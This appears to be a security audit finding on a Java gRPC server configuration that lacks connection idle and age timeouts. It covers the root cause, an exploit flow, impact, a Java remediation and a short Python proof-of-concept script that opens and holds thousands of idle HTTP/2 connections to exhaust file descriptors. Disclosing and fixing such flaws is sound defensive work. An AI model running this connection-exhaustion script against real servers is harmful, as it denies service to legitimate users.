### Title
Missing Server-Side Connection Idle/Age Timeout Enables Connection Exhaustion in `grpcServerConfigurer()`

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the Netty gRPC server with only an executor and a per-connection call limit, but sets no `maxConnectionIdle` or `maxConnectionAge`. Because Netty's defaults for both values are `Long.MAX_VALUE` (effectively infinite), an unprivileged attacker can open arbitrarily many TCP+HTTP/2 connections, send no RPC calls, and hold them open forever, consuming one file descriptor and associated memory per connection with no legitimate work performed.

### Finding Description
**Exact code location:** `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 27–35, function `grpcServerConfigurer()`.

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // default: 5
};
```

`NettyProperties` (lines 11–15 of `grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`) exposes only `maxConcurrentCallsPerConnection = 5`. No `maxConnectionIdle`, `maxConnectionAge`, `keepAliveTime`, or `keepAliveTimeout` field exists anywhere in the configuration hierarchy (confirmed: zero matches across all `.java` and `.yml` files in the repository).

**Root cause:** `NettyServerBuilder` defaults `maxConnectionIdle` and `maxConnectionAge` to `Long.MAX_VALUE` nanoseconds when not explicitly set. The server therefore never reclaims idle or long-lived connections on its own.

**Why the existing check is insufficient:** `maxConcurrentCallsPerConnection(5)` limits the number of active RPC streams *within* a single connection. It places no bound on the total number of simultaneous connections. An attacker holding 10,000 connections with 0 active calls each is entirely unaffected by this limit.

**Exploit flow:**
1. Attacker opens a raw TCP socket to port 5600.
2. Completes the HTTP/2 connection preface (24-byte magic + SETTINGS frame) — no authentication is required.
3. Sends no HEADERS or DATA frames (no RPC call is initiated).
4. Repeats steps 1–3 in a tight loop from one or more hosts.
5. Each connection is kept alive by the OS TCP stack (or by sending periodic HTTP/2 PING frames to prevent TCP-level RST).
6. The server never closes idle connections; each persists indefinitely.

### Impact Explanation
Each held connection consumes one file descriptor and kernel/JVM memory for the HTTP/2 connection state. The default Linux per-process file-descriptor limit is typically 65,535. Once exhausted, the gRPC server cannot accept new legitimate connections, effectively denying service to all subscribers of `ConsensusService/subscribeTopic` and `NetworkService`. Memory pressure from thousands of connection objects can additionally trigger GC storms or OOM conditions in the JVM. The `GrpcHighFileDescriptors` Prometheus alert (threshold: 80% of max FDs) confirms the project itself recognises FD exhaustion as a critical operational risk.

### Likelihood Explanation
No authentication or special privilege is required — any host that can reach port 5600 can execute this attack. The HTTP/2 handshake is a standard, well-documented sequence implementable in ~20 lines of Python using `h2` or `hyper`. The attack is trivially repeatable and scriptable. A single attacker machine with a modest number of source ports (ephemeral range ~28,000 ports) can exhaust the server's FD limit in one burst. The docker-compose nginx proxy applies a `grpc_read_timeout 600s` only to `subscribeTopic` responses, not to the connection establishment phase, and is absent in Kubernetes/bare-metal deployments where the gRPC port is exposed directly.

### Recommendation
Add the following calls inside the `grpcServerConfigurer()` lambda:

```java
serverBuilder.maxConnectionIdle(30, TimeUnit.SECONDS);   // close connections idle for >30s
serverBuilder.maxConnectionAge(300, TimeUnit.SECONDS);   // recycle long-lived connections
serverBuilder.maxConnectionAgeGrace(10, TimeUnit.SECONDS);
serverBuilder.keepAliveTime(60, TimeUnit.SECONDS);       // server-initiated ping interval
serverBuilder.keepAliveTimeout(10, TimeUnit.SECONDS);    // close if no ping ACK within 10s
serverBuilder.permitKeepAliveWithoutCalls(false);        // reject keepalive on idle streams
```

Expose these as configurable fields in `NettyProperties` so operators can tune them per deployment. Additionally, consider adding a network-level connection-rate limit (e.g., `iptables --hashlimit` or an Envoy/Istio policy) to bound the rate at which new connections can be established per source IP.

### Proof of Concept
```python
import socket, time

# Minimal HTTP/2 connection preface — no RPC call sent
HTTP2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
SETTINGS_FRAME = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"  # empty SETTINGS

sockets = []
TARGET = ("grpc-host", 5600)

for i in range(5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(TARGET)
    s.sendall(HTTP2_PREFACE + SETTINGS_FRAME)
    sockets.append(s)
    if i % 100 == 0:
        print(f"Held {i} connections")

# Hold forever — server never closes them
time.sleep(86400)
```
